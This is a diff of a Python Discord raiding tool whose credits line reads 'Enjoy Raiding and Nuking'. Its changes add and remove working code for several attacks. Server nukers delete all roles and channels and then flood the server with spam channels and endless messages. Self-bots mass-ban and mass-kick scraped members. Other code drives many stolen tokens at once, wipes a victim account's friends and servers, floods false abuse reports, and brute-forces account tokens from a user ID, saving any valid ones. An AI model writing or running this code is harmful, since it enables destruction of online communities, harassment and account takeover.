-        print('╭━━━┳╮╱╭┳━━━┳━━━┳╮╱╱╭╮╭╮╭━┳━━┳╮╱╱╭╮╱╱╭━━━┳━━━╮╭━╮╱╭┳╮╱╭┳╮╭━┳━━━┳━━━╮')
-        print('┃╭━╮┃┃╱┃┃╭━╮┃╭━╮┃╰╮╭╯┃┃┃┃╭┻┫┣┫┃╱╱┃┃╱╱┃╭━━┫╭━╮┃┃┃╰╮┃┃┃╱┃┃┃┃╭┫╭━━┫╭━╮┃')
-        print('┃╰━╯┃┃╱┃┃╰━━┫╰━━╋╮╰╯╭╯┃╰╯╯╱┃┃┃┃╱╱┃┃╱╱┃╰━━┫╰━╯┃┃╭╮╰╯┃┃╱┃┃╰╯╯┃╰━━┫╰━╯┃')
-        print('┃╭━━┫┃╱┃┣━━╮┣━━╮┃╰╮╭╯╱┃╭╮┃╱┃┃┃┃╱╭┫┃╱╭┫╭━━┫╭╮╭╯┃┃╰╮┃┃┃╱┃┃╭╮┃┃╭━━┫╭╮╭╯')
-        print('┃┃╱╱┃╰━╯┃╰━╯┃╰━╯┃╱┃┃╱╱┃┃┃╰┳┫┣┫╰━╯┃╰━╯┃╰━━┫┃┃╰╮┃┃╱┃┃┃╰━╯┃┃┃╰┫╰━━┫┃┃╰╮')
-        print('╰╯╱╱╰━━━┻━━━┻━━━╯╱╰╯╱╱╰╯╰━┻━━┻━━━┻━━━┻━━━┻╯╰━╯╰╯╱╰━┻━━━┻╯╰━┻━━━┻╯╰━╯')
-
-
-        TOKEN = input('Bot token: ')
-
-
-        print('[1]> Nuke')
-        print('[2]> Ban')
-
-
-        MAX_CHANNELS = 500
-
-
-        choicee = int(input('[?]>'))
-
-
-        if choicee == 1:
-            chanless = input('Channels names: ')
-            spam = input('Message you wanna spam: ')
-            print('For nuke write to chat: !Nuke')
-
-
-        if choicee == 2:
-            reason = input('Bans reason: ')
-            print('For for banning one guy write to chat: !OneBan')
-            print('For mass ban write to chat: !Ban')
-
-
-        client = commands.Bot(command_prefix="!")
-
-
-        @client.command()
-        async def Nuke(ctx):
-            await ctx.message.delete()
-            guild = ctx.guild
-
-
-            for role in guild.roles:
-                try:
-                    await role.delete()
-                    print(f'{role.name} Has been deleted')
-                except:
-                    print(f'[-] {role.name} Has not been deleted')
-
-
-            for channel in guild.channels:
-                try:
-                    await channel.delete()
-                    print(f'[+] {channel.name} Has been deleted')
-                except:
-                    print(f'[-] You cant delete {channel}')
-
-
-            try:
-                for i in range(MAX_CHANNELS):
-                    await guild.create_text_channel(chanless)
-                    print(f'[+] {chanless} has been created')
-            except:
-                print('[-] You havent got permission to create channels')
-
-
-        @client.command(pass_context=True)
-        async def Ban(ctx):
-            await ctx.message.delete()
-            guild = ctx.message.guild
-            for member in list(client.get_all_members()):
-                try:
-                    await guild.ban(member)
-                    print('[+] User '+member.name+" has been banned")
-                except:
-                    print('[-] You havent got permission to ban :(')
-
-
-        @client.command()
-        async def OneBan(ctx, member : discord.Member):
-            await ctx.message.delete()
-            try:
-                await member.ban(reason=reason)
-                print(f'[+] {member} was banned')
-            except:
-                print(f'[-] You dont have permission to ban {member}')
-
-
-        @client.event
-        async def on_guild_channel_create(channel):
-            while True:
-                try:
-                    await channel.send(spam)
-                    print('[+] SPAMMIMG :)')
-
-                except:
-                    print('[-] You cant spam lmaoooo')
-
-
-        def thread():
-                threading.Thread(target=on_guild_channel_create, args=(client.run(TOKEN))).start()
-        thread()
-
-        def thread2():
-                threading.Thread(target=Nuke, args=(client.run(TOKEN))).start()
-
-        thread2()
-
-        def thread3():
-                threading.Thread(target=Ban, args=(client.run(TOKEN))).start()
-
-        thread3()
-
-
-        exit = input('press any key: ')
+        time.sleep(5)
+        exit = input(f'press any key: ')
+        clear = lambda: os.system('cls')
+        exit = clear()
         exit = spammer()
 
 
     if choice == 10:
-        print('''
-╭━━━╮╱╱╱╱╱╱╱╱╱╱╱╱╱╭╮╭━╮╭╮╭╮╱╱╱╱╱╱╭━━━╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭╮╱╭━╮╱╭╮╱╱╭╮
-┃╭━╮┃╱╱╱╱╱╱╱╱╱╱╱╱╱┃┃┃╭╯┃┃┃┃╱╱╱╱╱╱┃╭━╮┃╱╱╱╱╱╱╱╱╱╱╱╱╱╭╯╰╮┃┃╰╮┃┃╱╱┃┃
-┃╰━╯┣╮╭┳━━┳━━┳╮╱╭╮┃╰╯╯╭┫┃┃┃╭━━┳━╮┃┃╱┃┣━━┳━━┳━━┳╮╭┳━╋╮╭╯┃╭╮╰╯┣╮╭┫┃╭┳━━┳━╮
-┃╭━━┫┃┃┃━━┫━━┫┃╱┃┃┃╭╮┃┣┫┃┃┃┃┃━┫╭╯┃╰━╯┃╭━┫╭━┫╭╮┃┃┃┃╭╮┫┃╱┃┃╰╮┃┃┃┃┃╰╯┫┃━┫╭╯
-┃┃╱╱┃╰╯┣━━┣━━┃╰━╯┃┃┃┃╰┫┃╰┫╰┫┃━┫┃╱┃╭━╮┃╰━┫╰━┫╰╯┃╰╯┃┃┃┃╰╮┃┃╱┃┃┃╰╯┃╭╮┫┃━┫┃
-╰╯╱╱╰━━┻━━┻━━┻━╮╭╯╰╯╰━┻┻━┻━┻━━┻╯╱╰╯╱╰┻━━┻━━┻━━┻━━┻╯╰┻━╯╰╯╱╰━┻━━┻╯╰┻━━┻╯
-╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╯┃
-╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯''')
+        def reaction(chd, iddd, start, org, token):
+            headers = {'Content-Type': 'application/json',
+                       'Accept': '*/*',
+                       'Accept-Encoding': 'gzip, deflate, br',
+                       'Accept-Language': 'en-US',
+                       'Cookie': f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
+                       'DNT': '1',
+                       'origin': 'https://discord.com',
+                       'TE': 'Trailers',
+                       'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
+                       'authorization': token,
+                       'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
+                       }
+
+            emoji = ej.emojize(org, use_aliases=True)
+            if start == '':
+                a = requests.put(
+                    f"https://discordapp.com/api/v6/channels/{chd}/messages/{iddd}/reactions/{emoji}/@me",
+                    headers=headers)
+                if a.status_code == 204:
+                    print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Reaction {org} added! ")
+                else:
+                    print(f"{Fore.LIGHTRED_EX}[-]{Fore.RESET} Error")
+
+            else:
+                print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} ERROR, press only ENTER')
+
+        tokens = open('tokens.txt', 'r').read().splitlines()
+        chd = input('Channel ID: ')
+        iddd = input('Message ID: ')
+        emoji = input('Emoji: ')
+        start = input("Press ENTER to start: ")
+        for token in tokens:
+            threading.Thread(target=reaction, args=(chd, iddd, start, emoji, token)).start()
+
+        time.sleep(5)
+        exit = input(f'press any key: ')
+        clear = lambda: os.system('cls')
+        exit = clear()
+        exit = spammer()
 
 
+    if choice == 11:
+
+        max_roles = 500
+        maxChannels = 500
+
+
+        print(f'{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} Account server Nuker')
+        print(f'{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} Bot server Nuker')
+
+
+        choicee1 = int(input('[?]>'))
+
+
+        if choicee1 == 1:
+            token = input('Account Token: ')
+            print(f'{Fore.LIGHTMAGENTA_EX}[1] {Fore.RESET}Nuker')
+            print(f'{Fore.LIGHTMAGENTA_EX}[2] {Fore.RESET}MassBan/MassKick')
+            choicr = int(input('[?]>'))
+
+
+            if choicr == 1:
+
+                intents = discord.Intents.all()
+                intents.members = True
+
+                headerrs = {'Authorization': f'{token}',
+                            "accept": "*/*",
+                            'origin': 'https://discord.com',
+                            'sec - fetch - mode': 'cors',
+                            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
+                            'sec - fetch - site': 'same - origin',
+                            'x - debug - options': 'bugReporterEnabled',
+                            'x - super - properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjIwMDAiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTAyMTEzLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ =='
+                            }
+                client = commands.Bot(command_prefix="!", case_insensitive=False, self_bot=True, intents=intents)
+
+                class UNuker:
+                    def SpamChannels(self, guild, name):
+                        while True:
+                            json = {'name': name, 'type': 0}
+                            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/channels', headers=headerrs,
+                                              json=json)
+                            if 'retry_after' in r.text:
+                                time.sleep(r.json()['retry_after'])
+                            else:
+                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
+                                    print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Created Channel ")
+                                    break
+                                else:
+                                    print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You cant create channels')
+
+                    def SpamRoles(self, guild, name):
+                        while True:
+                            json = {'name': name}
+                            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/roles', headers=headerrs,
+                                              json=json)
+                            if 'retry_after' in r.text:
+                                time.sleep(r.json()['retry_after'])
+                            else:
+                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
+                                    print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Created Role ")
+                                    break
+                                else:
+                                    print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You cant create roles')
+                                    break
+
+                    async def NukeStart(self):
+                        server = input(f'Server ID: ')
+                        chh = input(f"Channels Names: ")
+                        cha = input(f"Channels Amount: ")
+                        rn = input(f"Roles Names: ")
+                        ra = input(f"Roles Amount: ")
+
+                        for i in range(int(cha)):
+                            threading.Thread(target=self.SpamChannels, args=(server, chh,)).start()
+                        for i in range(int(ra)):
+                            threading.Thread(target=self.SpamRoles, args=(server, rn,)).start()
+
+                    async def Menu(self):
+                        choice = input('Press Enter: ')
+                        if choice == '':
+                            await self.NukeStart()
+                            time.sleep(2)
+                            await self.Menu()
+
+                    @client.event
+                    async def on_ready(*Args):
+                        await UNuker().Menu()
+
+                    def Check(self):
+                        try:
+                            client.run(token, bot=False)
+                        except:
+                            print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} Invalid Token ')
+                            input()
+                            os._exit(0)
+
+                if __name__ == "__main__":
+                    UNuker().Check()
+
+                time.sleep(5)
+                exit = input('press any key: ')
+                clear = lambda: os.system('cls')
+                exit = clear()
+                exit = spammer()
+            if choicr == 2:
+                print(f'{Fore.LIGHTRED_EX}Warning!{Fore.RESET} If you use MassBan or MassKick with a token where the mobile number is not verified, the token will be locked automatically and you will have to verify it.')
+
+                intents = discord.Intents.all()
+                intents.members = True
+
+                headerrss = {'Authorization': f'{token}',
+                            "accept": "*/*",
+                            'origin': 'https://discord.com',
+                            'sec - fetch - mode': 'cors',
+                            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
+                            'sec - fetch - site': 'same - origin',
+                            'x - debug - options': 'bugReporterEnabled',
+                            'x - super - properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjIwMDAiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTAyMTEzLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ =='
+                            }
+                client = commands.Bot(command_prefix=">", case_insensitive=False, self_bot=True, intents=intents)
+
+                client.remove_command("help")
+
+                class MassBan:
+
+                    def BanMembers(self, guild, member):
+                        while True:
+                            r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{member}",
+                                             headers=headerrss)
+                            if 'retry_after' in r.text:
+                                time.sleep(r.json()['retry_after'])
+                            else:
+                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
+                                    print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Banning {member}")
+                                    break
+                                else:
+                                    break
+
+                    def KickMembers(self, guild, member):
+                        while True:
+                            r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/members/{member}",
+                                                headers=headerrss)
+                            if 'retry_after' in r.text:
+                                time.sleep(r.json()['retry_after'])
+                            else:
+                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
+                                    print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Kicking {member}')
+                                    break
+                                else:
+                                    break
+
+                    async def Scrape(self):
+                        guild = input(f'Server ID: ')
+                        await client.wait_until_ready()
+                        guildOBJ = client.get_guild(int(guild))
+                        members = await guildOBJ.chunk()
+
+                        try:
+                            os.remove("N/members.txt")
+                        except:
+                            pass
+
+                        membercount = 0
+                        with open('N/members.txt', 'a') as m:
+                            for member in members:
+                                m.write(str(member.id) + "\n")
+                                membercount += 1
+                            print(f"Info: {membercount} Members")
+                            m.close()
+
+
+
+                    async def BanExecute(self):
+                        guild = input(f'Server ID: ')
+                        print()
+                        members = open('N/members.txt')
+                        for member in members:
+                            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
+                        members.close()
+
+                    async def KickExecute(self):
+                        guild = input(f'Server ID: ')
+                        print()
+                        members = open('N/members.txt')
+                        for member in members:
+                            threading.Thread(target=self.KickMembers, args=(guild, member,)).start()
+                        members.close()
+
+                    async def Menu(self):
+                        print(f'{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} MassBan')
+                        print(f'{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} MassKick')
+
+                        choice = input(f'[?]>')
+                        if choice == '1':
+                            await self.Scrape()
+                            time.sleep(3)
+                            sure = input('MassBAN y/n?: ').lower()
+                            if sure == 'y':
+                                await self.BanExecute()
+                                time.sleep(2)
+                                await self.Menu()
+
+                            if sure == 'n':
+                                exit = input('press any key: ')
+                                clear = lambda: os.system('cls')
+                                exit = clear()
+                                exit = spammer()
+
+                        elif choice == '2':
+                            await self.Scrape()
+                            time.sleep(3)
+                            sure = input('MassKick y/n?: ').lower()
+                            if sure == 'y':
+                                await self.KickExecute()
+                                time.sleep(2)
+                                await self.Menu()
+                            if sure == 'n':
+                                exit = input('press any key: ')
+                                clear = lambda: os.system('cls')
+                                exit = clear()
+                                exit = spammer()
+
+
+                    @client.event
+                    async def on_ready(*args):
+                        await MassBan().Menu()
+
+                    def Startup(self):
+                        try:
+                            client.run(token, bot=False)
+
+
+                        except:
+                            print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} Invalid Token')
+                            time.sleep(2)
+                            exit = input('press any key: ')
+                            clear = lambda: os.system('cls')
+                            exit = clear()
+                            exit = spammer()
+
+
+                if __name__ == "__main__":
+                    MassBan().Startup()
+
+                time.sleep(5)
+                exit = input('press any key: ')
+                clear = lambda: os.system('cls')
+                exit = clear()
+                exit = spammer()
+
+
+        if choicee1 == 2:
+            TOKEN = input('Bot token: ')
+            MAX_CHANNELS = 500
+            print(f'{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} Nuke')
+            print(f'{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} MassBan')
+
+
+            choicee = int(input('[?]>'))
+
+
+            if choicee == 1:
+                chanless = input('Channels names: ')
+                spam = input('Message you wanna spam: ')
+                print(f'{Fore.LIGHTMAGENTA_EX}For nuke write to chat: !Nuke{Fore.RESET}')
+
+
+            if choicee == 2:
+                reason = input('Bans reason: ')
+                print(f'{Fore.LIGHTMAGENTA_EX}For for banning one guy write to chat: !OneBan{Fore.RESET}')
+                print(f'{Fore.LIGHTMAGENTA_EX}For mass ban write to chat: !Ban{Fore.RESET}')
+
+
+            client = commands.Bot(command_prefix="!")
+
+
+            @client.command()
+            async def Nuke(ctx):
+                await ctx.message.delete()
+                guild = ctx.guild
+
+
+                for role in guild.roles:
+                    try:
+                        await role.delete()
+                        print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{role.name} Has been deleted{Fore.RESET}')
+                    except:
+                        print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}{role.name} Has not been deleted')
+
+
+                for channel in guild.channels:
+                    try:
+                        await channel.delete()
+                        print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{channel.name} Has been deleted')
+                    except:
+                        print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You cant delete {channel}')
+
+
+                try:
+                    for i in range(MAX_CHANNELS):
+                        await guild.create_text_channel(chanless)
+                        print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{chanless} has been created')
+                except:
+                    print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You havent got permission to create channels')
+
+
+            @client.command(pass_context=True)
+            async def Ban(ctx):
+                await ctx.message.delete()
+                guild = ctx.message.guild
+                for member in list(client.get_all_members()):
+                    try:
+                        await guild.ban(member)
+                        print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} User '+member.name+" has been banned")
+                    except:
+                        print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You havent got permission to ban :(')
+
+
+            @client.command()
+            async def OneBan(ctx, member : discord.Member):
+                await ctx.message.delete()
+                try:
+                    await member.ban(reason=reason)
+                    print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} {member} was banned')
+                except:
+                    print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You dont have permission to ban {member}')
+
+
+            @client.event
+            async def on_guild_channel_create(channel):
+                while True:
+                    try:
+                        await channel.send(spam)
+                        print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} SPAMMIMG :)')
+
+                    except:
+                        print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You cant spam')
+
+
+            def thread():
+                    threading.Thread(target=on_guild_channel_create, args=(client.run(TOKEN))).start()
+            thread()
+
+            def thread2():
+                    threading.Thread(target=Nuke, args=(client.run(TOKEN))).start()
+
+            thread2()
+
+            def thread3():
+                    threading.Thread(target=Ban, args=(client.run(TOKEN))).start()
+
+            thread3()
+
+        time.sleep(5)
+        exit = input('press any key: ')
+        clear = lambda: os.system('cls')
+        exit = clear()
+        exit = spammer()
+
+
+    if choice == 12:
+        print('')
         tokenn = input("Token: ")
-        print('''
-[1] Server spam
-[2] Remove all friends
-[3] Block all friends
-[4] Spam settings
-[5] Leave all servers
-[6] Close all DMs
-[7] Send mass DM
-[8] Delete all personal Servers''')
+
+        print(f'''{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} Server spam
+{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} Remove all friends
+{Fore.LIGHTMAGENTA_EX}[3]{Fore.RESET} Block all friends
+{Fore.LIGHTMAGENTA_EX}[4]{Fore.RESET} Spam settings
+{Fore.LIGHTMAGENTA_EX}[5]{Fore.RESET} Leave all servers
+{Fore.LIGHTMAGENTA_EX}[6]{Fore.RESET} Close all DMs
+{Fore.LIGHTMAGENTA_EX}[7]{Fore.RESET} Send mass DM
+{Fore.LIGHTMAGENTA_EX}[8]{Fore.RESET} Delete all personal Servers''')
 
         def generate_random_string(Ammount):
             string_returned = "".join(
@@ -591,7 +946,7 @@ def spammer():
                     f"https://canary.discord.com/api/v8/users/@me/relationships/{i['id']}",
                     headers=headers,
                 )
-                print(f"Removed Friend {i['id']}")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}Removed Friend {i['id']}")
 
         def block_friends(Token):
             headers = {"authorization": Token, "user-agent": "bruh6/9"}
@@ -605,10 +960,10 @@ def spammer():
                     headers=headers,
                     json=json,
                 )
-                print(f"Blocked Friend {i['id']}")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}Blocked Friend {i['id']}")
 
         def settings(Token):
-            print('Started Job')
+            print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}Starting')
             for i in range(0, 100):
                 headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
                 condition_status = True
@@ -652,7 +1007,7 @@ def spammer():
                     f"https://canary.discord.com/api/v8/users/@me/guilds/{guild['id']}",
                     headers=headers,
                 )
-                print(f"Left Guild: {guild['id']}")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}Left Guild: {guild['id']}")
 
         def dms_close(Token):
             headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
@@ -678,11 +1033,11 @@ def spammer():
                     headers=headers,
                     data=json,
                 )
-                print(f"Sent DM To {channel['id']}")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}Sent DMs to {channel['id']}")
 
         def delete_servers(Token):
             headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
-            print("Got Data")
+            print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET} Deleting...")
             delete_personal_request = requests.get(
                 "https://discord.com/api/v9/users/@me/guilds", headers=headers
             ).json()
@@ -694,7 +1049,7 @@ def spammer():
                 print(i["id"])
 
 
-        options_list = {
+        options = {
             "1": servers,
             "2": remove_friends,
             "3": block_friends,
@@ -724,7 +1079,7 @@ def spammer():
             if choiceee == 8:
                 delete_servers()
             else:
-                options_list[choiceee](tokenn)
+                options[choiceee](tokenn)
 
         if __name__ == "__main__":
             while 1:
@@ -733,95 +1088,61 @@ def spammer():
                 except KeyboardInterrupt:
                     sys.exit()
 
-        exit = input('press any key: ')
-        exit = spammer()
-
-    if choice == 11:
-
-        print('''╔═══╗─────────────╔╗╔═╗╔╗╔╗──────╔═╗╔═╗─────────╔═══╗──────────╔╗
-║╔═╗║─────────────║║║╔╝║║║║──────║║╚╝║║─────────║╔═╗║─────────╔╝╚╗
-║╚═╝╠╗╔╦══╦══╦╗─╔╗║╚╝╝╔╣║║║╔══╦═╗║╔╗╔╗╠══╦══╦══╗║╚═╝╠══╦══╦══╦╩╗╔╝
-║╔══╣║║║══╣══╣║─║║║╔╗║╠╣║║║║║═╣╔╝║║║║║║╔╗║══╣══╣║╔╗╔╣║═╣╔╗║╔╗║╔╣║
-║║──║╚╝╠══╠══║╚═╝║║║║╚╣║╚╣╚╣║═╣║─║║║║║║╔╗╠══╠══║║║║╚╣║═╣╚╝║╚╝║║║╚╗
-╚╝──╚══╩══╩══╩═╗╔╝╚╝╚═╩╩═╩═╩══╩╝─╚╝╚╝╚╩╝╚╩══╩══╝╚╝╚═╩══╣╔═╩══╩╝╚═╝
-─────────────╔═╝║──────────────────────────────────────║║
-─────────────╚══╝──────────────────────────────────────╚╝ 
-''')
-
-
-        sent = 0
-        session = Session()
-        print('[1] illegal Conent')
-        print('[2] Harrassment')
-        print('[3] Spam or Phishing Links')
-        print('[4] Self harm')
-        print('[5] NSFW Content')
-
-
-        tokeen = input("Token: ")
-        headers = {'Authorization': tokeen, 'Content-Type': 'application/json'}
-        r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
-        if r.status_code == 200:
-            pass
-        else:
-            print("Invalid Token")
-            input()
-        id = input("Server ID: ")
-        id1 = input("Channel ID: ")
-        message = input("Message ID: ")
-        reason = input("Option: ")
-
-
-        def Main():
-            global sent
-            headers = {
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36',
-                'Authorization': tokeen,
-                'Content-Type': 'application/json'
-            }
-
-
-            payload = {
-                'channel_id': id1,
-                'guild_id': id,
-                'message_id': message,
-                'reason': reason
-            }
-
-
-            while True:
-                sent = 0
-                r = requests.post('https://discord.com/api/v6/report', headers=headers, json=payload)
-                if r.status_code == 201:
-                    print("Sent Report")
-                    sent += 1
-
-
-                elif r.status_code == 401:
-                    print("Invalid token")
-                    input()
-
-
-                else:
-                    print("Error")
-
-
-        print()
-        for i in range(50000):
-            Thread(target=Main).start()
+        time.sleep(5)
 
         exit = input('press any key: ')
+        clear = lambda: os.system('cls')
+        exit = clear()
         exit = spammer()
 
 
-    if choice == 12:
-        print('''╭━╮╱╭━┳━╮╱╱╭┳┳╮╱╱╱╱╱╱╱╱╭━━╮╭╮╱╱╱╱╱╱╭━━╮╱╱╱╭╮╱╱╭━╮
-┃╋┣┳┫━┫━╋┳╮┃╭╋╋╮╭╮╭━┳┳╮╰╮╭┻┫┣┳━┳━┳╮┃╭╮┣┳┳┳┫╰┳━┫━╋━┳┳┳━┳━┳┳╮
-┃╭┫┃┣━┣━┃┃┃┃╰┫┃╰┫╰┫┻┫╭╯╱┃┃╋┃━┫┻┫┃┃┃┃╭╮┃╭┫┃┃╭┫┻┫╭┫╋┃╭┫━┫┻┫╭╯
-╰╯╰━┻━┻━╋╮┃╰┻┻┻━┻━┻━┻╯╱╱╰┻━┻┻┻━┻┻━╯╰━━┻╯╰━┻━┻━┻╯╰━┻╯╰━┻━┻╯
-╱╱╱╱╱╱╱╱╰━╯ 
-Do not do this without the permission of the person to whom the bruteforce attack is conducted.''')
+    if choice == 13:
+        def online(token, act):
+            ws = websocket.WebSocket()
+            status = 'online'
+            ws.connect('wss://gateway.discord.gg/?v=6&encoding=json')
+            we = json.loads(ws.recv())
+            innt = we['d']['heartbeat_interval']
+            akt = {
+                'name': act,
+                'type': 0}
+            headerrrr = {'op': 2,
+                    'd': {'token': token,
+                          'properties': {'$os': sys.platform,
+                                         '$browser': 'RTB',
+                                         '$device': f"{sys.platform} Device"
+                                         },
+                          'presence': {'game': akt,
+                                       'status': status,
+                                       'since': 0,
+                                       'afk': False
+                                       }
+                          },
+                    's': None,
+                    't': None}
+            ws.send(json.dumps(headerrrr))
+            print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Set status as: ' + act)
+            ackt = {'op': 1,
+                   'd': None}
+            while 1:
+                time.sleep(innt / 1000)
+                ws.send(json.dumps(ackt))
 
+        text = input(f"Activity Status: ")
+        tokens = open('tokens.txt', 'r').read().splitlines()
+        for token in tokens:
+            threading.Thread(target=online, args=(token, text)).start()
+
+
+        time.sleep(5)
+        exit = input('press any key: ')
+        clear = lambda: os.system('cls')
+        exit = clear()
+        exit = spammer()
+
+    if choice == 14:
+
+        print('Do not do this without the permission of the person to whom the bruteforce attack is conducted.')
 
         id_to_token = base64.b64encode((input("Id of user: ")).encode("ascii"))
         id_to_token = str(id_to_token)[2:-1]
@@ -840,11 +1161,11 @@ Do not do this without the permission of the person to whom the bruteforce attac
                 login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
                 try:
                     if login.status_code == 200:
-                        print('[+] VALID' + ' ' + token)
+                        print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} VALID' + ' ' + token)
                         f = open('grab.txt', "a+")
                         f.write(f'{token}\n')
                     else:
-                        print('[-] INVALID' + ' ' + token)
+                        print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} INVALID' + ' ' + token)
                 finally:
                     print('')
 
@@ -858,23 +1179,26 @@ Do not do this without the permission of the person to whom the bruteforce attac
 
 
         exit = input('press any key: ')
+        clear = lambda: os.system('cls')
+        exit = clear()
         exit = spammer()
 
 
-    if choice == 13:
-        print('''Wassup buddy. This is fun made tool by Lososik...      
+    if choice == 15:
+        print(f'''{Fore.LIGHTMAGENTA_EX}Wassup buddy. This is fun made tool by Lososik...      
 If you have got some problems join https://dsc.gg/deadd or contact Lososik#0954.
 Enjoy Raiding and Nuking :D
 Special thanks to H0LLOW for helping me with a few things.
-''')
+{Fore.RESET}''')
 
 
         exit = input('press any key: ')
+        clear = lambda: os.system('cls')
+        exit = clear()
         exit = spammer()
 
 
-    if choice == 14:
+    if choice == 16:
         quit('')
-
 
 spammer()
